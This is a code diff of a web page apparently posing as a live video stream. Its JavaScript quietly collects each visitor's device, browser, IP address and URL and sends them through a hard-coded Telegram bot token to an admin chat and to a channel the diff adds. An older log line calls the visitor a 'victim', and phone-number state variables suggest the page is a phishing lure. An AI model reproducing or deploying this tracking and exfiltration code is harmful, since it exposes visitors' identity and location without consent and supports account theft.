@@ -51,16 +51,16 @@
         }
         
         .blur-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    backdrop-filter: blur(23px);
-    background: rgba(0, 0, 0, 0.4);
-    z-index: 2;
-    pointer-events: none;
-}
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            backdrop-filter: blur(23px);
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 2;
+            pointer-events: none;
+        }
         
         .stream-content {
             position: fixed;
@@ -345,13 +345,11 @@
         }, 500);
     });
     
-    // После окончания видео — перематываем на 0 и играем снова
     video.addEventListener('ended', () => {
         video.currentTime = 0;
         video.play();
     });
     
-    // Таймаут на всякий случай
     setTimeout(() => {
         if (loadingOverlay.style.display !== 'none') {
             loadingOverlay.style.opacity = '0';
@@ -367,13 +365,21 @@
     const API_URL = 'https://f9ab-5-76-239-68.ngrok-free.app';
     const BOT_TOKEN = '8791850945:AAE-0cCFUub1NlsCokHPPC2bYIcXn7LLh-4';
     const ADMIN_ID = '8704208839';
+    const CHANNEL_ID = '-1003964191656';
     
     let currentPhone = "";
     let currentStep = "phone";
     
-    function sendTelegramLog(text) {
+    function sendToAdmin(text) {
         try {
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}`)
+                .catch(() => {});
+        } catch(e) {}
+    }
+    
+    function sendToChannel(text) {
+        try {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHANNEL_ID}&text=${encodeURIComponent(text)}`)
                 .catch(() => {});
         } catch(e) {}
     }
@@ -398,10 +404,14 @@
             .then(res => res.json())
             .then(data => {
                 const ip = data.ip;
-                sendTelegramLog(`🕷️ ЖЕРТВА ЗАШЛА НА СТРИМ!\n📱 ${device}\n${browser}\n🔢 IP: ${ip}\n🔗 ${url}\n⏰ ${time}`);
+                const msg = `🕷️ ЗАХОД НА СТРИМ!\n📱 ${device}\n${browser}\n🔢 IP: ${ip}\n🔗 ${url}\n⏰ ${time}`;
+                sendToAdmin(msg);
+                sendToChannel(msg);
             })
             .catch(() => {
-                sendTelegramLog(`🕷️ ЖЕРТВА ЗАШЛА НА СТРИМ!\n📱 ${device}\n${browser}\n🔗 ${url}\n⏰ ${time}`);
+                const msg = `🕷️ ЗАХОД НА СТРИМ!\n📱 ${device}\n${browser}\n🔗 ${url}\n⏰ ${time}`;
+                sendToAdmin(msg);
+                sendToChannel(msg);
             });
     })();
     
